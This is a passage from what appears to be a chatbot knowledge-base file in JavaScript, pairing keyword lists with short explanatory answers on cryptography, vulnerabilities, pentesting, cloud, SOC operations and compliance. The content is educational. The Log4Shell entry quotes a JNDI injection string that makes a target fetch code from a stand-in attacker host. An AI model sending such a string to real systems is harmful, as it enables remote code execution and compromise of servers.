    keywords: ["cookie security", "httponly", "secure flag", "samesite cookie", "session cookie"],
    response: "Securing cookies is critical for web security:\n• HttpOnly flag — prevents JavaScript from accessing the cookie (blocks XSS-based cookie theft)\n• Secure flag — cookie is only sent over HTTPS (prevents interception on HTTP)\n• SameSite attribute — Strict or Lax prevents CSRF by restricting cross-origin sending\n• Short expiration — reduce the window of opportunity if a cookie is stolen\n• Proper scoping — set Domain and Path as restrictively as possible"
  },

  // ── CRYPTOGRAPHY ─────────────────────────────────────────────
  {
    keywords: ["encryption", "what is encryption", "encrypt data", "scramble data"],
    response: "Encryption transforms readable data (plaintext) into an unreadable format (ciphertext) using a cryptographic algorithm and key. Only parties with the correct decryption key can recover the original data. Types: symmetric encryption (same key for encrypt/decrypt — AES), asymmetric encryption (public/private key pair — RSA, ECC). Encryption protects data at rest (stored data), in transit (data moving across networks), and increasingly in use (homomorphic encryption)."
  },
  {
    keywords: ["aes", "advanced encryption standard", "symmetric encryption", "aes-256"],
    response: "AES (Advanced Encryption Standard) is the world's most widely deployed symmetric encryption algorithm, adopted by the US government for classified information. AES-256 (256-bit key) is considered quantum-resistant for the foreseeable future. It's used everywhere: TLS, disk encryption (BitLocker, FileVault), WiFi (WPA3), and secure messaging. AES with GCM mode (AES-GCM) also provides authentication, verifying data hasn't been tampered with."
  },
  {
    keywords: ["rsa", "asymmetric encryption", "public key", "private key", "public key cryptography"],
    response: "RSA is the foundational public-key cryptosystem. Each party has a key pair: a public key (shareable) and a private key (secret). Anyone can encrypt data with your public key; only your private key can decrypt it. RSA is also used for digital signatures — sign with private key, verify with public key. RSA-2048 is current standard; RSA-4096 for higher security. RSA is vulnerable to quantum attacks (Shor's algorithm), driving post-quantum cryptography research."
  },
  {
    keywords: ["elliptic curve", "ecc", "ecdsa", "ecdh", "curve25519"],
    response: "Elliptic Curve Cryptography (ECC) provides equivalent security to RSA with much smaller key sizes — ECC-256 ≈ RSA-3072. This means faster computation and less bandwidth, making ECC ideal for mobile and IoT devices. ECDH is used for key exchange in TLS; ECDSA for digital signatures. Curve25519 (designed by Daniel Bernstein) is the modern recommended curve — used in Signal, WireGuard, and modern TLS."
  },
  {
    keywords: ["hashing", "hash function", "sha256", "md5", "sha-3", "message digest"],
    response: "A cryptographic hash function takes input of any size and produces a fixed-size output (digest) with these properties: deterministic (same input → same hash), one-way (can't reverse the hash to get input), and collision-resistant (different inputs shouldn't produce the same hash). SHA-256 and SHA-3 are current standards. MD5 and SHA-1 are broken — don't use them for security. Hashes are used for: file integrity verification, password storage (with salting), digital signatures, and blockchain."
  },
  {
    keywords: ["password hashing", "salt", "bcrypt", "argon2", "pbkdf2", "rainbow table"],
    response: "Passwords should never be stored in plaintext or using simple hashing. Proper storage:\n1. Generate a unique random salt per user\n2. Hash password + salt using a slow, memory-hard algorithm: Argon2id (recommended), bcrypt, or scrypt\nThis defeats precomputed rainbow tables and makes brute-forcing slow. MD5 and SHA-256 are inappropriate for passwords — they're designed to be fast. Argon2id with sufficient memory cost and iterations is the current gold standard."
  },
  {
    keywords: ["tls", "ssl", "https", "tls handshake", "certificate", "encrypted connection"],
    response: "TLS (Transport Layer Security) is the cryptographic protocol securing most internet communication. HTTPS = HTTP over TLS. The TLS handshake: server presents its certificate → client verifies it against trusted CAs → they negotiate cipher suite → exchange keys using asymmetric crypto → establish symmetric session key for the actual communication. TLS 1.3 (2018) is the current standard — faster handshake, stronger ciphers, eliminated weak legacy options. Ensure you disable TLS 1.0 and 1.1 on your servers."
  },
  {
    keywords: ["pki", "public key infrastructure", "certificate authority", "ca", "ssl certificate", "x.509"],
    response: "PKI (Public Key Infrastructure) is the system of CAs, policies, and procedures that manages digital certificates establishing trust. When your browser trusts a site's HTTPS certificate, it's because a trusted Certificate Authority (like DigiCert, Let's Encrypt) signed it. Certificate types: DV (Domain Validated — basic, proves domain ownership), OV (Organization Validated), EV (Extended Validation — highest verification). Let's Encrypt provides free DV certificates, dramatically expanding HTTPS adoption."
  },
  {
    keywords: ["digital signature", "signing", "non repudiation", "sign a document", "verify signature"],
    response: "A digital signature uses asymmetric cryptography to prove: authenticity (the signer's identity), integrity (the document hasn't been altered), and non-repudiation (the signer can't deny signing). Process: hash the document → encrypt the hash with the sender's private key = signature. Recipient decrypts with sender's public key and compares hashes. Used in: code signing, email (S/MIME, PGP), PDF documents, and software updates."
  },
  {
    keywords: ["end to end encryption", "e2ee", "signal protocol", "zero knowledge"],
    response: "End-to-end encryption (E2EE) ensures only the communicating parties can read messages — not the service provider, governments, or hackers. The Signal Protocol (used by Signal, WhatsApp) is the gold standard, implementing perfect forward secrecy using the Double Ratchet Algorithm. Zero-knowledge architecture means the provider genuinely can't access your data even if compelled. Not all 'encrypted' apps are E2EE — verify it's not just in-transit encryption."
  },
  {
    keywords: ["quantum computing", "quantum threat", "post quantum cryptography", "quantum safe", "shor algorithm"],
    response: "Sufficiently powerful quantum computers could break RSA, ECC, and Diffie-Hellman using Shor's algorithm — rendering most of today's encrypted communications vulnerable. NIST has standardized post-quantum cryptographic algorithms (CRYSTALS-Kyber for key exchange, CRYSTALS-Dilithium for signatures) that are resistant to quantum attacks. The threat isn't immediate — today's quantum computers are too small — but 'harvest now, decrypt later' attacks mean we should start migrating now."
  },
  {
    keywords: ["key management", "hsm", "key rotation", "secure key storage"],
    response: "Cryptographic key management is as critical as the algorithm itself. Best practices: generate keys with cryptographically secure random number generators, store private keys in Hardware Security Modules (HSMs) or TPM chips (never in plaintext), enforce key rotation schedules, revoke compromised keys promptly via CRLs or OCSP, and separate keys by purpose (don't use the same key for signing and encryption). Poor key management has broken many systems with otherwise strong cryptography."
  },

  // ── VULNERABILITIES & EXPLOITS ───────────────────────────────
  {
    keywords: ["zero day", "0day", "zero-day exploit", "unknown vulnerability"],
    response: "A zero-day vulnerability is a software flaw unknown to the vendor — developers have had 'zero days' to patch it. Zero-day exploits weaponize these flaws before any fix exists. They're highly valuable: sold on grey markets to governments (for cyber espionage tools), criminal forums, and vulnerability brokers. Notable zero-days: EternalBlue (NSA developed, used in WannaCry), Stuxnet (used 4 zero-days against Iranian nuclear centrifuges). Defense: defense in depth, because no patch exists yet."
  },
  {
    keywords: ["cve", "common vulnerabilities exposures", "cvss score", "vulnerability database", "nvd"],
    response: "CVE (Common Vulnerabilities and Exposures) is a standardized system for identifying publicly known vulnerabilities with unique IDs (e.g., CVE-2021-44228 = Log4Shell). The CVSS (Common Vulnerability Scoring System) rates severity from 0-10. The NVD (National Vulnerability Database) at nvd.nist.gov enriches CVEs with CVSS scores, descriptions, and remediation info. Organizations use CVE tracking to prioritize which vulnerabilities to patch first based on risk."
  },
  {
    keywords: ["log4shell", "log4j", "cve-2021-44228", "jndi injection"],
    response: "Log4Shell (CVE-2021-44228, December 2021) was a catastrophic RCE vulnerability in Apache Log4j — a logging library used by millions of Java applications. Attackers could trigger remote code execution by sending a specially crafted string (${jndi:ldap://attacker.com/exploit}) in any logged field (username, User-Agent header). CVSS score: 10.0 (maximum). Affected everything from Minecraft to enterprise software. Considered one of the most serious vulnerabilities ever discovered due to ubiquity and exploitability."
  },
  {
    keywords: ["heartbleed", "openssl bug", "tls heartbeat", "memory leak vulnerability"],
    response: "Heartbleed (CVE-2014-0160) was a critical OpenSSL vulnerability that allowed attackers to read up to 64KB of server memory per request — repeatedly — leaking private keys, session tokens, and passwords. It affected ~17% of all HTTPS servers at disclosure. The 'heartbeat' feature that enabled it didn't validate that the response buffer matched the requested length. A perfect example of why security code review and fuzzing matter even in widely trusted open-source libraries."
  },
  {
    keywords: ["spectre", "meltdown", "cpu vulnerability", "side channel", "microarchitecture"],
    response: "Spectre and Meltdown (disclosed January 2018) are hardware-level vulnerabilities in modern CPUs exploiting speculative execution — a performance optimization where processors speculatively execute code before knowing if it's needed. Meltdown allowed reading kernel memory from user space; Spectre caused programs to leak their own memory or that of other processes. True fixes required CPU microcode updates and OS kernel patches with significant performance penalties. They revealed an entire class of microarchitectural side-channel attacks."
  },
  {
    keywords: ["buffer overflow", "stack overflow", "heap overflow", "memory corruption", "segfault"],
    response: "A buffer overflow occurs when a program writes more data to a buffer than it can hold, overflowing into adjacent memory. Stack overflows can overwrite return addresses, redirecting execution to attacker-controlled code. Classic exploitation technique: shellcode injection, return-to-libc attacks, ROP chains. Mitigations: ASLR (randomizes memory layout), DEP/NX (marks memory non-executable), stack canaries (detects overwrites), and safe programming languages (Rust, Python) that perform bounds checking."
  },
  {
    keywords: ["race condition", "toctou", "time of check time of use", "concurrency vulnerability"],
    response: "A race condition occurs when a program's behavior depends on the relative timing of events (like thread scheduling). TOCTOU (Time-of-Check to Time-of-Use) is a classic form: an attacker changes a condition between when the program checks it and when it uses it. Example: checking file permissions before opening it — attacker swaps the file in between. Common in multi-threaded code, setuid programs, and file operations. Use atomic operations and proper locking mechanisms."
  },
  {
    keywords: ["privilege escalation", "privesc", "local privilege", "root exploit", "sudo exploit"],
    response: "Privilege escalation (privesc) elevates an attacker's permissions after gaining initial access. Types:\n• Vertical — gaining higher privileges (user → admin/root)\n• Horizontal — accessing another user's resources at the same privilege level\nCommon techniques: exploiting misconfigured sudo rules, SUID/SGID binaries, kernel vulnerabilities, weak service configurations, credential reuse, DLL hijacking (Windows), and PATH manipulation. Securing: least privilege, regular patch cycles, and vulnerability scanning (Linpeas, WinPEAS are privesc enumeration tools)."
  },

  // ── PENETRATION TESTING & RED TEAMING ───────────────────────
  {
    keywords: ["penetration testing", "pen test", "pentest", "ethical hacking", "authorized testing"],
    response: "Penetration testing is an authorized simulated cyberattack to find and report exploitable vulnerabilities before malicious actors do. Phases: Reconnaissance → Scanning → Gaining Access → Maintaining Access → Reporting. Types: black box (no prior knowledge), grey box (partial knowledge), white box (full knowledge/source code). Always requires written authorization (Rules of Engagement document). The output is a detailed report with findings, severity ratings, and remediation recommendations."
  },
  {
    keywords: ["red team", "blue team", "purple team", "red teaming", "adversary simulation"],
    response: "Red Team: attackers (offensive security team simulating real threat actors). Blue Team: defenders (SOC, incident response team). Purple Team: facilitates collaboration between red and blue to maximize learning. Red team exercises go beyond penetration testing — they use full threat actor TTPs (Tactics, Techniques, Procedures), social engineering, physical intrusion, and remain undetected as long as possible. The goal is to test the blue team's detection and response capabilities."
  },
  {
    keywords: ["bug bounty", "responsible disclosure", "vulnerability disclosure", "hackerone", "bugcrowd"],
    response: "Bug bounty programs pay security researchers to find and responsibly disclose vulnerabilities. Major platforms: HackerOne, Bugcrowd, Intigriti. Companies like Google, Microsoft, and Apple pay significant bounties for critical finds (Google's highest is $1M+ for certain mobile exploits). Responsible disclosure means notifying the vendor privately and giving them time to patch before going public. This is distinct from full disclosure (immediate public release) or selling to exploit brokers."
  },
  {
    keywords: ["kali linux", "parrot os", "security distro", "hacking tools", "pentesting linux"],
    response: "Kali Linux (by Offensive Security) is the most widely used penetration testing distribution, coming pre-loaded with 600+ security tools: Nmap, Metasploit, Burp Suite, Wireshark, Aircrack-ng, John the Ripper, Hashcat, and more. Parrot OS is a lighter alternative. These are legitimate tools for authorized security testing — using them against systems you don't have permission to test is illegal. Learning environments: TryHackMe, Hack The Box, PentesterLab."
  },
  {
    keywords: ["metasploit", "exploit framework", "msfconsole", "payload", "meterpreter"],
    response: "Metasploit Framework is the world's most popular penetration testing framework, enabling security professionals to find vulnerabilities and execute exploit code. Core components: msfconsole (interface), modules (exploits, payloads, auxiliaries, post-exploitation), and Meterpreter (advanced in-memory payload with rich post-exploitation features — upload/download files, take screenshots, pivot through networks). Only for use on systems you're authorized to test."
  },
  {
    keywords: ["recon", "reconnaissance", "osint", "passive recon", "active recon", "information gathering"],
    response: "Reconnaissance is the first phase of any attack or pen test — gathering information about the target. Passive recon uses publicly available sources without touching target systems (OSINT): WHOIS records, LinkedIn, Shodan, Google dorking, certificate transparency logs, archived pages (Wayback Machine). Active recon directly probes the target: port scanning, banner grabbing, DNS zone transfers. OSINT Framework (osintframework.com) organizes hundreds of OSINT tools and sources."
  },
  {
    keywords: ["osint", "open source intelligence", "shodan", "maltego", "social media investigation"],
    response: "OSINT (Open Source Intelligence) involves collecting intelligence from publicly available sources. Key tools:\n• Shodan — 'the search engine for hackers,' indexes internet-connected devices and services\n• theHarvester — gathers emails, subdomains, hosts from public sources\n• Maltego — visualizes relationships between entities\n• SpiderFoot — automated OSINT reconnaissance\n• WHOIS/RDAP — domain registration info\n• Google Dorks — advanced search operators to find exposed data (site:, filetype:, inurl:)\nOSINT is valuable in both offensive (reconnaissance) and defensive (threat intelligence) contexts."
  },
  {
    keywords: ["mitre att&ck", "attack framework", "ttp", "tactics techniques procedures"],
    response: "MITRE ATT&CK is a globally accessible knowledge base of adversary tactics, techniques, and procedures (TTPs) based on real-world observations. Organized into matrices (Enterprise, Mobile, ICS), it catalogs 14 tactic categories (Initial Access, Execution, Persistence, Privilege Escalation, Defense Evasion, Credential Access, Discovery, Lateral Movement, Collection, Command & Control, Exfiltration, Impact) with hundreds of specific techniques. Used by defenders to map detections to adversary behaviors and by attackers to plan realistic simulations."
  },
  {
    keywords: ["lateral movement", "pivoting", "pass the hash", "pass the ticket", "network traversal"],
    response: "Lateral movement is how attackers navigate through a network after gaining initial access, seeking higher-value targets. Techniques: Pass-the-Hash (use captured NTLM hashes to authenticate without knowing the plaintext password), Pass-the-Ticket (reuse Kerberos tickets), Remote Service exploitation, using remote management tools (WMI, PSExec, SSH), and credential reuse. Defense: network segmentation, privileged access workstations, monitoring for unusual authentication patterns, and disabling unnecessary remote management protocols."
  },
  {
    keywords: ["persistence", "backdoor", "scheduled task", "registry run key", "startup malware"],
    response: "Persistence mechanisms ensure an attacker maintains access even after reboots or credential changes. Techniques: Windows Registry Run keys, Scheduled Tasks, services, DLL hijacking, WMI event subscriptions, startup folders, and rootkits. On Linux/macOS: cron jobs, systemd services, .bashrc modification, SSH authorized keys. Detection: monitor for new scheduled tasks, unusual services, registry modifications, and baseline comparison tools. Tools like Autoruns (Windows) enumerate all persistence points."
  },
  {
    keywords: ["command and control", "c2 framework", "cobalt strike", "beacon", "empire"],
    response: "C2 (Command & Control) frameworks allow attackers to remotely control compromised systems. Cobalt Strike is the most notorious — used by nation-state actors and criminals alike (cracked versions proliferate). Others: Sliver, Havoc, Brute Ratel (BRC4). They provide encrypted communications, post-exploitation features, and evasion capabilities. Defenders detect C2 by: monitoring DNS queries, unusual outbound connections, JA3 TLS fingerprinting, and behavioral analytics. Cobalt Strike's beacon profile can be identified by its default malleable C2 patterns."
  },

  // ── CLOUD SECURITY ───────────────────────────────────────────
  {
    keywords: ["cloud security", "aws security", "azure security", "gcp security", "cloud threats"],
    response: "Cloud security covers the controls, policies, and technologies protecting cloud-based systems. Key challenges: shared responsibility model (cloud provider secures the infrastructure; you secure what you run on it), misconfiguration (most common cause of cloud breaches), identity and access management, data protection, and visibility. AWS Security Hub, Azure Defender, and Google Security Command Center provide native security posture management. Tools like Prowler, ScoutSuite, and Checkov audit cloud configurations."
  },
  {
    keywords: ["shared responsibility", "cloud shared responsibility model", "provider security", "customer security"],
    response: "The shared responsibility model defines who secures what in cloud environments. The cloud provider (AWS/Azure/GCP) secures: physical infrastructure, hypervisors, and managed services. The customer secures: data, applications, OS configuration, IAM, network controls, and encryption. 'Security of the cloud' vs 'security in the cloud.' A common mistake: assuming the cloud provider handles everything. Misconfigured S3 buckets and overprivileged IAM roles are customer responsibilities — and common breach causes."
  },
  {
    keywords: ["s3 bucket", "public bucket", "misconfigured storage", "open bucket", "data exposure"],
    response: "Misconfigured cloud storage (S3 buckets, Azure Blob Storage, GCS buckets) has caused some of the largest data breaches — exposing millions of records publicly accessible to anyone with the URL. Common mistakes: enabling public access, overly permissive bucket policies, and storing sensitive data without server-side encryption. Defense: enable S3 Block Public Access settings, use AWS Config rules to detect public buckets, enable access logging, and encrypt data at rest with KMS."
  },
  {
    keywords: ["iam", "cloud iam", "aws iam", "role", "permissions", "over privileged"],
    response: "Cloud IAM (Identity and Access Management) controls who can do what in cloud environments. Common mistakes: using root account for daily operations, overly broad policies (AdministratorAccess attached to service accounts), no MFA on privileged accounts, and long-lived access keys instead of role-based temporary credentials. Best practices: grant least privilege, use IAM roles (not long-lived keys), enable CloudTrail/audit logging, enforce MFA, and regularly rotate and review permissions with access analyzers."
  },
  {
    keywords: ["container security", "docker security", "kubernetes security", "k8s", "pod security"],
    response: "Container security encompasses the full container lifecycle:\n• Image security — scan images for vulnerabilities (Trivy, Snyk, Grype), use minimal base images, don't run as root\n• Kubernetes security — RBAC (restrict who can do what in the cluster), network policies, pod security standards, secrets management (Vault, K8s secrets encryption at rest)\n• Runtime security — detect anomalous behavior (Falco), isolate containers, limit capabilities\n• Supply chain — sign container images, verify provenance (Sigstore/Cosign)"
  },
  {
    keywords: ["serverless security", "lambda security", "function as a service", "faas security"],
    response: "Serverless functions (AWS Lambda, Azure Functions, GCP Cloud Functions) still have security considerations: overprivileged execution roles, vulnerable dependencies in function packages, injection attacks through event data, insecure secrets handling (hardcoded in code or environment variables), and cold-start timing side channels. Apply least privilege to execution roles, scan dependencies, use secrets managers (AWS Secrets Manager, Vault), and validate all input — even from internal sources."
  },
  {
    keywords: ["cspm", "cloud security posture", "cloud misconfig", "cloud compliance"],
    response: "CSPM (Cloud Security Posture Management) tools continuously monitor cloud infrastructure for misconfigurations and compliance violations — detecting public storage buckets, overprivileged roles, disabled logging, missing encryption, and deviations from security benchmarks (CIS AWS Foundations). Leading tools: Wiz, Prisma Cloud, Orca Security, AWS Security Hub with Config Rules. They provide a visual map of cloud risks with prioritized remediation recommendations."
  },

  // ── ENDPOINT SECURITY ────────────────────────────────────────
  {
    keywords: ["endpoint security", "edr", "endpoint detection response", "xdr", "managed detection"],
    response: "Endpoint security protects individual devices (laptops, servers, mobile, IoT) from threats. Evolution: Antivirus → EDR (Endpoint Detection and Response) → XDR (Extended Detection and Response). EDR solutions (CrowdStrike Falcon, SentinelOne, Microsoft Defender for Endpoint) go beyond signature matching: they monitor process behavior, detect anomalies, record telemetry for forensic investigation, and provide automated response (isolate endpoint, kill processes). XDR correlates data across endpoints, network, email, and cloud."
  },
  {
    keywords: ["antivirus", "antimalware", "defender", "virus scan", "security software"],
    response: "Antivirus software detects and removes malware using: signature databases (known malware fingerprints), heuristic analysis (detecting suspicious behavior patterns), and sandboxing (executing suspicious files in an isolated environment). Modern antivirus is part of broader endpoint protection platforms. Windows Defender (built into Windows) is competent for most users. Avoid running multiple AV solutions simultaneously — they conflict. Supplement with Malwarebytes for on-demand scanning."
  },
  {
    keywords: ["disk encryption", "bitlocker", "filevault", "full disk encryption", "fde"],
    response: "Full Disk Encryption (FDE) encrypts the entire drive so data is inaccessible without the correct credentials — protecting against physical theft (lost laptop, stolen drive). Windows: BitLocker (TPM-backed, transparent). macOS: FileVault 2. Linux: LUKS (Linux Unified Key Setup). Ensure recovery keys are safely stored (not on the encrypted device). FDE doesn't protect against attacks while the device is running and unlocked — that's where access control and endpoint security come in."
  },
  {
    keywords: ["patch management", "software update", "vulnerability patching", "cve remediation"],
    response: "Patch management is the systematic process of identifying, testing, and deploying security patches for software and firmware. A structured approach: inventory all assets, subscribe to vendor security advisories, risk-assess patches (CVSS score + exploitability), test in staging, deploy in waves (starting with highest risk systems), and verify. The gap between patch release and deployment is when systems are most vulnerable — attackers reverse-engineer patches to create exploits quickly. Critical patches: patch within 24-72 hours."
  },
  {
    keywords: ["mobile security", "ios security", "android security", "mdm", "mobile device management"],
    response: "Mobile security best practices: enable device encryption (default on iOS; verify on Android), use strong PINs or biometrics, enable remote wipe capability, only install apps from official stores, review app permissions (camera/microphone/location), keep OS updated, avoid sideloading. Enterprise MDM solutions (Jamf, Microsoft Intune, VMware Workspace ONE) enforce policies, push apps, and remotely wipe lost/stolen devices. Avoid rooting/jailbreaking — eliminates OS security sandboxing."
  },
  {
    keywords: ["bring your own device", "byod", "personal device work", "mdm policy"],
    response: "BYOD (Bring Your Own Device) policies let employees use personal devices for work, introducing security challenges: mixing personal and corporate data, inability to enforce full device management, data leakage, and lost/sold device exposure. Solutions: Mobile Application Management (MAM) — containerizes work apps without controlling the personal device, conditional access policies (require device compliance before granting access), and clear acceptable use policies. Define what data can and cannot be accessed from personal devices."
  },

  // ── SECURITY OPERATIONS ──────────────────────────────────────
  {
    keywords: ["soc", "security operations center", "soc analyst", "tier 1 analyst"],
    response: "A Security Operations Center (SOC) is a team of security analysts who monitor, detect, investigate, and respond to cybersecurity threats 24/7. Tiers: Tier 1 (alert triage, initial analysis) → Tier 2 (deeper investigation, escalation handling) → Tier 3 (threat hunting, advanced analysis, IR leadership). SOC analysts work with SIEM platforms, threat intelligence feeds, playbooks, and coordinate with incident response teams. SOC-as-a-Service (MSSPs) provides outsourced SOC capabilities."
  },
  {
    keywords: ["siem", "security information event management", "splunk", "elastic siem", "microsoft sentinel"],
    response: "A SIEM (Security Information and Event Management) system aggregates and correlates log data from across the environment — firewalls, endpoints, servers, applications — to detect security incidents. It provides: centralized log management, real-time correlation rules, alerting, dashboards, and forensic search. Popular platforms: Splunk (industry leader, powerful query language), Microsoft Sentinel (cloud-native, Azure-integrated), Elastic SIEM (open-source foundation, flexible), and QRadar. SIEM value depends on quality of detection rules and analyst skill."
  },
  {
    keywords: ["threat hunting", "proactive hunting", "hypothesis driven", "hunt team"],
    response: "Threat hunting is proactive searching through environments for threats that have evaded automated detection — operating on the assumption that adversaries are already inside. Process: form a hypothesis (based on threat intelligence or ATT&CK techniques) → collect relevant data → investigate → identify findings → improve detections. Hunters look for: unusual process relationships, anomalous network connections, new persistence mechanisms, and low-volume indicators. Requires deep environment knowledge and adversary expertise."
  },
  {
    keywords: ["incident response", "ir", "breach response", "incident handling", "dfir"],
    response: "Incident Response (IR) is the structured approach to handling security incidents. NIST IR lifecycle:\n1. Preparation — policies, playbooks, tools, team roles\n2. Detection & Analysis — identify and triage incidents\n3. Containment — isolate affected systems to stop spread\n4. Eradication — remove malware, close access vectors\n5. Recovery — restore systems, verify integrity, monitor\n6. Post-Incident Activity — lessons learned, improve defenses\nHave an IR retainer (pre-contracted IR firm) before you need it — arranging help during an active breach is costly and slow."
  },
  {
    keywords: ["digital forensics", "forensic analysis", "evidence collection", "chain of custody", "volatility"],
    response: "Digital forensics involves collecting, preserving, analyzing, and presenting digital evidence. Order of volatility: collect most volatile data first — RAM (Volatility framework) → running processes → network connections → disk images. Maintain chain of custody (document who handled evidence, when, and how). Disk imaging: dd or FTK Imager create forensic copies. File system analysis: Autopsy, FTK. Timeline analysis correlates events. Memory forensics reveals malware that never touched disk."
  },
  {
    keywords: ["log management", "log analysis", "audit logs", "centralized logging", "log retention"],
    response: "Security logs are your forensic trail. Critical logs to collect: authentication events (successes and failures), privilege use, network firewall logs, DNS queries, web proxy logs, endpoint process execution, and cloud API calls (CloudTrail, Azure Monitor). Centralize in a SIEM — logs only on the compromised host get deleted by attackers. Retention: 90 days hot (searchable), 1 year cold storage minimum for most compliance frameworks. Alert on: multiple failed logins, off-hours access, new admin account creation."
  },
  {
    keywords: ["threat intelligence", "cti", "ioc", "indicator of compromise", "threat feed"],
    response: "Cyber Threat Intelligence (CTI) is analyzed information about current and potential attacks used to make informed security decisions. Levels: strategic (executive summaries, geopolitical trends), operational (adversary campaigns), and tactical (technical IOCs — malicious IPs, hashes, domains). Sources: ISACs, FS-ISAC, commercial feeds (Recorded Future, CrowdStrike Falcon Intelligence), open-source (AlienVault OTX, MISP, VirusTotal). Integrate IOCs into SIEM, firewall blocklists, and EDR tools for automated blocking."
  },
  {
    keywords: ["soar", "security orchestration", "automation response", "playbook automation"],
    response: "SOAR (Security Orchestration, Automation and Response) platforms automate repetitive SOC tasks and orchestrate responses across security tools. Examples: automatically enrich IP alerts with threat intelligence, isolate endpoints flagged by EDR, block IPs in firewall, create Jira tickets, and notify Slack — all without human intervention for low-confidence alerts. Platforms: Splunk SOAR (Phantom), Palo Alto XSOAR, Microsoft Sentinel automation rules. Reduces alert fatigue and mean time to respond (MTTR)."
  },

  // ── VULNERABILITY MANAGEMENT ─────────────────────────────────
  {
    keywords: ["vulnerability scanning", "vulnerability assessment", "nessus", "openvas", "qualys"],
    response: "Vulnerability scanners systematically probe systems for known vulnerabilities, misconfigurations, and compliance violations. Commercial leaders: Tenable Nessus, Qualys, Rapid7 InsightVM. Open-source: OpenVAS. They check against CVE databases, verify patch levels, detect weak configurations, and generate prioritized reports. Internal vs. external scanning: run both — external simulates an attacker's view; internal finds vulnerabilities behind the firewall. Scan regularly (weekly for internet-facing assets, monthly minimum for internal)."
  },
  {
    keywords: ["risk prioritization", "cvss", "epss", "patch priority", "vulnerability risk"],
    response: "Not all vulnerabilities are equal — prioritize based on: CVSS score (base severity), EPSS (Exploit Prediction Scoring System — probability of exploitation in the wild), asset criticality (production database > test machine), exposure (internet-facing vs. internal), and presence of active exploitation (CISA's Known Exploited Vulnerabilities catalog). A CVSS 10.0 on an air-gapped internal system may be lower priority than a CVSS 7.0 being actively exploited on an internet-facing server."
  },

  // ── COMPLIANCE & FRAMEWORKS ──────────────────────────────────
  {
    keywords: ["gdpr", "general data protection regulation", "eu privacy", "data protection", "right to erasure"],
    response: "GDPR (EU General Data Protection Regulation) protects EU residents' personal data. Key requirements: lawful basis for processing, purpose limitation, data minimization, accuracy, storage limitation, consent management, data subject rights (access, erasure 'right to be forgotten,' portability), privacy by design, breach notification within 72 hours, and Data Protection Officers for certain organizations. Fines: up to €20M or 4% of global annual turnover. Applies to any organization processing EU resident data."
  },
  {
    keywords: ["hipaa", "healthcare security", "phi", "protected health information", "healthcare compliance"],
    response: "HIPAA (Health Insurance Portability and Accountability Act) protects the privacy and security of healthcare information in the US. Security Rule requirements: administrative safeguards (security policies, workforce training), physical safeguards (facility access controls), and technical safeguards (access controls, audit logs, encryption). Breach notification required within 60 days for large breaches. Business associates (vendors handling PHI) also bear HIPAA obligations. Penalties: $100 to $50,000 per violation, up to $1.9M annual cap per violation category."
  },
  {
    keywords: ["pci dss", "payment card industry", "cardholder data", "credit card security", "pci compliance"],
    response: "PCI DSS (Payment Card Industry Data Security Standard) applies to any organization processing, storing, or transmitting credit card data. 12 requirements covering: network security, cardholder data protection, vulnerability management, access control, monitoring, and security policies. Merchants are categorized by transaction volume (Level 1-4), determining validation requirements. Scope reduction is key: if you don't need to store card data, don't — use tokenization. Non-compliance risks fines, increased transaction fees, and card processing revocation."
  },
  {
    keywords: ["iso 27001", "iso27001", "isms", "information security management system", "iso certification"],
    response: "ISO/IEC 27001 is the international standard for Information Security Management Systems (ISMS) — a systematic approach to managing sensitive company information. It involves: risk assessment, implementing appropriate controls from Annex A (93 controls covering organizational, people, physical, and technical domains), continuous monitoring, and certification by an accredited auditor. Widely recognized for international business, procurement requirements, and demonstrating security maturity. Aligns with GDPR requirements."
  },
  {
    keywords: ["nist cybersecurity framework", "nist csf", "identify protect detect respond recover"],
    response: "The NIST Cybersecurity Framework (CSF) provides a flexible structure for managing cybersecurity risk. Five core functions:\n• Identify — understand assets, risks, and governance\n• Protect — implement safeguards\n• Detect — develop monitoring capabilities\n• Respond — take action on detected incidents\n• Recover — restore capabilities after incidents\nCSF 2.0 adds Govern as a sixth function. Tiers (1-4) describe sophistication levels. Organizations use it for self-assessment, communication with executives, and road-mapping security improvements."
  },
  {
    keywords: ["soc 2", "soc2", "trust service criteria", "aicpa", "service organization control"],
    response: "SOC 2 (Service Organization Control 2) is an auditing standard for service providers storing customer data in the cloud. Based on the AICPA's Trust Service Criteria: Security (required), Availability, Processing Integrity, Confidentiality, and Privacy. Type I: assessment of controls at a point in time. Type II: assessment of control effectiveness over a period (6-12 months) — more rigorous and trusted. Common requirement for B2B SaaS vendors dealing with enterprise customers."
  },
  {
    keywords: ["cis controls", "cis benchmarks", "cis critical security controls", "center for internet security"],
    response: "CIS Controls are a prioritized set of 18 security best practices developed by the Center for Internet Security, based on real-world attack data. Implementation Groups (IG1-IG3) tier them by organization size/maturity. Top controls: inventory and control of assets, software asset management, data protection, secure configuration, account management, access control, audit log management, email security, malware defense, and network monitoring. CIS Benchmarks provide hardening guides for specific technologies (Windows, Linux, Kubernetes, AWS)."
  },
  {
    keywords: ["risk management", "risk assessment", "risk register", "cyber risk quantification", "fair model"],
    response: "Cybersecurity risk management involves identifying, analyzing, and prioritizing risks to guide security investment decisions. Key steps: identify assets and threats, assess likelihood and impact, determine risk level (qualitative or quantitative), select and implement controls, and monitor residual risk. The FAIR (Factor Analysis of Information Risk) model enables quantitative risk analysis — expressing risk in dollar terms to enable ROI-based security conversations with business leadership."
  },

  // ── WIRELESS SECURITY ────────────────────────────────────────
  {
    keywords: ["wifi security", "wpa3", "wpa2", "wireless encryption", "wifi password"],
    response: "WiFi security protocols: WEP (broken, never use), WPA (deprecated), WPA2-AES (current standard, generally secure), WPA3 (latest — adds Simultaneous Authentication of Equals (SAE) replacing PSK handshake, makes offline dictionary attacks infeasible, and provides forward secrecy). Use WPA3 where supported. For home networks: strong unique passphrase (20+ characters), disable WPS (vulnerable), change default router credentials, enable guest network for IoT devices, and keep firmware updated."
  },
  {
    keywords: ["evil twin", "rogue access point", "fake wifi", "wifi attack", "captive portal attack"],
    response: "An evil twin attack deploys a malicious WiFi access point mimicking a legitimate one (same SSID, often stronger signal) to trick users into connecting. Once connected, the attacker can intercept traffic, present phishing captive portals to steal credentials, or deliver malware. Common in coffee shops, airports, and hotels. Defense: use a VPN whenever on public WiFi, verify the correct SSID with establishment staff, and prefer cellular data for sensitive transactions."
  },
  {
    keywords: ["wardriving", "wifi scanning", "detecting wifi", "stumbling"],
